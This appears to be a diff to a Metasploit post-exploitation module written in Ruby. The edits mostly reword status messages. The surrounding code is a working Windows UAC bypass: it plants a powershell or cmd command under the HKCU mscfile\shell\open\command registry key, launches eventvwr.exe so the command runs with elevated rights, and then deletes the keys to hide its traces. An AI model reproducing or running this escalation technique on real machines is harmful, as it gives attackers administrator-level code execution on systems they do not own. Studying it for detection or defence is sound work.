@@ -209,12 +209,15 @@ def ls_stage1
       check_success = registry_getvaldata("#{uac_hivek}","#{uac_level}")
       # a dword:2 value it means 'always notify' setting is active.
       if check_success == 2
-        print_warning("Target UAC set to: always notify")
+        print_warning("Target UAC set to: #{check_success} (always notify)")
         print_error("[ABORT]: module can not work under this condictions...")
         print_error("Remote system its not vulnerable to the exploit code!")
         print_line("")
         Rex::sleep(1.0)
         return nil
+      else
+        print_good("  exec => Target UAC set to: #{check_success} (exploitable)")
+        Rex::sleep(1.0)
       end
 
         #
@@ -223,20 +226,24 @@ def ls_stage1
         #
         if datastore['USE_POWERSHELL'] == true
           comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{psh_comma} #{exec_comm}\" /f"
+          print_good("  exec => Injecting shellcode(base64) string (powershell.exe)")
+          Rex::sleep(1.0)
         else
           comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{comm_path} #{exec_comm}\" /f"
+          print_good("  exec => Injecting cmd command (cmd.exe)")
+          Rex::sleep(1.0)
         end
 
  # Execute process hijacking in registry (cmd.exe OR powershell.exe)...
  # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "powershell.exe -nop -enc aDfSjRnGlsgVkGftmoEdD==" /f
  # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "c:\windows\System32\cmd.exe /c start notepad.exe" /f
- print_good("  exec => hijacking proccess to gain code execution...")
+ print_good("  exec => Hijacking proccess to gain code execution...")
  r = session.sys.process.execute("cmd.exe /c #{comm_inje}", nil, {'Hidden' => true, 'Channelized' => true})
  # give a proper time to refresh regedit
  Rex::sleep(4.5)
 
       # start remote service to gain code execution
-      print_good("  exec => starting eventvwr.exe native process...")
+      print_good("  exec => Starting eventvwr.exe native process...")
       r = session.sys.process.execute("cmd.exe /c start #{vul_serve}", nil, {'Hidden' => true, 'Channelized' => true})
       Rex::sleep(1.0)
 
@@ -278,7 +285,7 @@ def ls_stage2
     print_warning("Reading proccess registry hive keys...")
     Rex::sleep(1.0)
     if registry_enumkeys("HKCU\\Software\\Classes\\mscfile\\shell\\open\\command")
-      print_good(" exec => remote registry hive key found!")
+      print_good(" exec => Remote registry hive key found!")
       Rex::sleep(1.0)
     else
        # registry hive key not found, aborting module execution.
@@ -292,7 +299,7 @@ def ls_stage2
 
  # Delete hijacking hive keys from target regedit...
  # REG DELETE HKCU\Software\Classes /f -> mscfile\shell\open\command
- print_good("  exec => deleting HKCU hive registry keys...")
+ print_good("  exec => Deleting HKCU hive registry keys...")
  r = session.sys.process.execute("cmd.exe /c #{reg_clean}", nil, {'Hidden' => true, 'Channelized' => true})
  # give a proper time to refresh regedit
  Rex::sleep(3.0)
@@ -393,7 +400,7 @@ def run
 
       # Variable declarations (msf API calls)
       sysnfo = session.sys.config.sysinfo
-      runtor = client.sys.config.getuid
+      runtor = client.sys.config.getuid # <-- error in this key? why?
       runsession = client.session_host
       directory = client.fs.dir.pwd
 
@@ -409,7 +416,7 @@ def run
     print_line("    Operative System    : #{sysnfo['OS']}")
     print_line("    Target IP addr      : #{runsession}")
     print_line("    Payload directory   : #{directory}")
-    print_line("    Client UID          : #{runtor}")
+    print_line("    Client UID          : #{runtor}") # <-- error in this key? why?
     print_line("")
     print_line("")
 
@@ -418,6 +425,11 @@ def run
     # the 'def check()' funtion that rapid7 requires to accept new modules.
     # Guidelines for Accepting Modules and Enhancements:https://goo.gl/OQ6HEE
     #
+    # check for proper operative system (windows)
+    #if client.platform !~ /win32|win64/i
+    #  print_error("[ ABORT ]: This module only works againts windows systems")
+    #  raise Rex::Script::Completed
+    #end
     # check for proper session (meterpreter)
     # the non-return of sysinfo command reveals
     # that we are not on a meterpreter session!
